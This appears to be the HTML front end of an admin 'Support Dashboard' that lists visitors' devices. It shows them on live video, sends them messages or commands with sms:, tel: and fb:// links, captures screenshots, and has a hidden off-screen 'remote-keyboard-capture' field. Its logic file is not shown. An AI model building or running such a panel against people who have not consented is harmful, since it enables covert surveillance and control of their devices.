<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="admin.css" />
  </head>
  <body class="dark-mode">
    <input
      type="text"
      id="remote-keyboard-capture"
      style="
        position: fixed;
        opacity: 0;
        top: -100px;
        left: -100px;
        width: 1px;
        height: 1px;
      "
      autocomplete="off"
    />

    <div id="login-screen" class="screen active">
      <div class="login-box">
        <div class="logo">
          <svg
            width="32"
            height="32"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        <h2>Admin Sign In</h2>
        <p>Enter your credentials to access the support dashboard.</p>
        <input
          type="password"
          id="admin-password"
          placeholder="Enter admin password..."
        />
        <button id="login-btn">Access Dashboard</button>
        <div id="login-error" class="error-text"></div>
      </div>
    </div>

    <div id="dashboard-screen" class="screen">
      <header>
        <div class="header-left">
          <h1>Support Dashboard</h1>
          <div class="nav-tabs">
            <button
              class="nav-tab active"
              data-filter="all"
              onclick="setFilter('all')"
            >
              All Devices
            </button>
            <button
              class="nav-tab"
              data-filter="online"
              onclick="setFilter('online')"
            >
              Live Devices
            </button>
            <button
              class="nav-tab"
              data-filter="offline"
              onclick="setFilter('offline')"
            >
              Offline Devices
            </button>
          </div>
        </div>
        <div class="header-right">
          <span class="status-indicator"
            ><span class="dot online"></span> Server Online</span
          >
          <div class="search-wrapper">
            <input
              type="text"
              id="search-bar"
              placeholder="Search by ID or email..."
            />
          </div>
          <button
            id="refresh-btn"
            class="icon-btn"
            title="Refresh Dashboard"
            onclick="refreshDashboard()"
          >
            <svg
              id="refresh-icon"
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <polyline points="23 4 23 10 17 10"></polyline>
              <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
            </svg>
          </button>
          <button id="theme-toggle" class="icon-btn" title="Toggle Theme">
            <svg
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
            >
              <circle cx="12" cy="12" r="5"></circle>
              <line x1="12" y1="1" x2="12" y2="3"></line>
              <line x1="12" y1="21" x2="12" y2="23"></line>
              <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
              <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
              <line x1="1" y1="12" x2="3" y2="12"></line>
              <line x1="21" y1="12" x2="23" y2="12"></line>
              <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
              <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
            </svg>
          </button>
          <button
            id="signout-btn"
            class="icon-btn danger"
            title="Sign Out"
            onclick="signOut()"
          >
            <svg
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
              <polyline points="16 17 21 12 16 7"></polyline>
              <line x1="21" y1="12" x2="9" y2="12"></line>
            </svg>
          </button>
        </div>
      </header>

      <main id="visitor-grid" class="grid">
        <div id="empty-state" class="empty-state">
          <svg
            width="48"
            height="48"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="1.5"
          >
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
            <circle cx="9" cy="7" r="4"></circle>
            <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
            <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
          </svg>
          <p>No devices found in this view.</p>
        </div>
      </main>
    </div>

    <div id="expand-modal" class="modal">
      <div class="modal-content">
        <button class="modal-close" onclick="closeModal()">&times;</button>
        <div id="modal-video-container" class="video-container"></div>
        <div class="modal-controls">
          <div class="quick-actions">
            <button onclick="insertScheme('modal-msg-input', 'sms:')">
              sms:
            </button>
            <button onclick="insertScheme('modal-msg-input', 'tel:')">
              tel:
            </button>
            <button onclick="insertScheme('modal-msg-input', 'fb://')">
              fb://
            </button>
            <button onclick="insertScheme('modal-msg-input', 'https://')">
              https://
            </button>
          </div>
          <div class="message-row">
            <input
              type="text"
              id="modal-msg-input"
              placeholder="Send message or command..."
            />
            <button onclick="sendModalMessage()">Send</button>
            <button
              class="capture-btn"
              onclick="captureScreenshot(currentModalId)"
            >
              Capture
            </button>
          </div>
        </div>
      </div>
    </div>

    <div id="delete-modal" class="modal">
      <div class="modal-content delete-modal-content">
        <h3>End Session?</h3>
        <p>
          This will disconnect the visitor and permanently remove the device
          from your dashboard.
        </p>
        <div class="delete-actions">
          <button class="btn-cancel" onclick="closeDeleteModal()">
            Cancel
          </button>
          <button class="btn-danger" id="confirm-delete-btn">
            Disconnect & Delete
          </button>
        </div>
      </div>
    </div>

    <div id="admin-toast-container" class="toast-container"></div>

    <script src="admin.js"></script>
  </body>
</html>
